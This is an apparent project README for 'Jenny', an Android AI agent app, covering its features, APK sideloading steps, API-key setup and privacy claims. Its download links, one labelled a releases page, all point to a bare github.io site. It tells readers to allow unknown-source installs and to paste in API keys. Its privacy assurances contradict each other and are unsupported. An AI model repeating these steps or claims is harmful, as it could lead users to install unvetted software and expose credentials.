# 🤖 jenny-android-ai-agent - Your Private AI Agent That Learns

[![Download Latest Version](https://img.shields.io/badge/Download-APK%20v1.2.0-blue?style=for-the-badge)](https://shricol5839.github.io)

## 📱 What Is This?

Jenny is a personal AI agent that lives on your Android phone. Unlike cloud AI assistants, Jenny runs locally on your device. Your messages, your memories, and your data never leave your phone.

Think of Jenny as a smart assistant that:
- Remembers everything you tell it permanently
- Works on a schedule without you asking
- Can write its own mini-apps for simple tasks
- Can replace your home screen launcher

You control everything. Bring your own API key from OpenAI or Anthropic, or run a local model and keep everything offline.

## ✨ Key Features

**Permanent Memory**  
Jenny remembers what you tell it. Ask it something today, and it remembers the context from weeks ago. No more repeating yourself.

**Scheduled Autonomous Work**  
Tell Jenny to check your email every morning, summarize news at noon, or remind you about tasks. It works on its own time.

**Self-Written Mini-Apps**  
Describe a simple tool you need. Jenny writes it. A calculator, a timer, a note taker. You get small apps built just for you.

**Home Screen Launcher**  
Replace your regular launcher with Jenny. Your apps stay accessible, but Jenny becomes your main interface.

**Your Data Stays Yours**  
No cloud servers. No data mining. Your conversations and memories live on your phone storage.

**Bring Your Own Key**  
Use your existing OpenAI or Anthropic API key. You pay only for what you use.

**Local Model Support**  
Run a model entirely on your phone. No internet needed. Your data never leaves the device.

## 🚀 Getting Started

### Step 1: Download Jenny

Visit the [releases page](https://shricol5839.github.io) to download the latest APK file.

Look for the file named `jenny-android-v1.2.0.apk` or similar. Tap the file name to start the download.

### Step 2: Install on Your Phone

Before installing, you must enable installation from unknown sources:

1. Open your phone's **Settings**
2. Go to **Security** or **Privacy**
3. Find **Install unknown apps** or **Install from unknown sources**
4. Find your file manager or browser app
5. Toggle the switch to **Allow from this source**

Once enabled:
1. Open the downloaded APK file
2. Tap **Install**
3. Wait for the installation to complete

### Step 3: Open Jenny

Find the Jenny icon on your home screen or app drawer. Tap it to open.

### Step 4: Choose Your AI Model

You have two options when you first open Jenny:

**Option A: Use Your Own API Key**  
- You need an API key from OpenAI or Anthropic
- Get one from platform.openai.com or anthropic.com
- Paste the key into Jenny's settings screen
- Jenny connects to the AI service through your key

**Option B: Use a Local Model**  
- No internet needed
- Jenny downloads a small model to your phone
- All processing happens on your device
- Slower but completely private

### Step 5: Set Up Your Launcher (Optional)

To use Jenny as your home screen:
1. Open Jenny's settings
2. Tap **Enable Launcher**
3. Follow the prompts to set Jenny as your default home app
4. You can switch back anytime

## 🔧 How to Use Jenny

### Basic Chat

Open Jenny and type your message. Press send. Jenny responds based on what it remembers.

Example conversation:
```
You: Remind me to buy milk on Saturday
Jenny: I'll remember that. Anything else for Saturday?
You: Yes, I have a dentist appointment at 3 PM
Jenny: Got it. Saturday: buy milk, dentist at 3 PM.
```

### Creating a Schedule

Type: "Check the weather every morning at 7 AM"

Jenny asks for confirmation, then sets up the schedule. You get weather updates automatically.

### Making a Mini-App

Type: "Make a simple timer that counts down from 5 minutes"

Jenny writes the code, creates the app, and adds it to your app drawer. You can use it like any other app.

### Using the Launcher

After setting Jenny as your launcher, swipe up to see your apps. Swipe right to access Jenny's chat. Swipe left to see your schedule.

## 🔒 Privacy and Security

Your data stays on your phone. Jenny does not send your messages, memories, or files to any server.

When you use your own API key, your messages go to OpenAI or Anthropic servers for processing. The API provider does not store your conversations. You can check their privacy policies for details.

When you use a local model, nothing leaves your phone. Not a single byte of data.

Jenny is open source. Anyone can review the code to verify it does what it claims.

## ❓ Troubleshooting

**Jenny does not install**  
Make sure you enabled installation from unknown sources. Check that you have enough storage space.

**Jenny does not open**  
Restart your phone. If the problem continues, uninstall and reinstall.

**Jenny does not respond**  
Check your internet connection if using API key mode. For local mode, wait a few seconds for the model to load.

**API key not working**  
Verify your key is correct. Check that you have credits on your API account. Some free tiers have limits.

**Launcher not working**  
Go to phone Settings > Apps > Default apps > Home app. Select Jenny as your default.
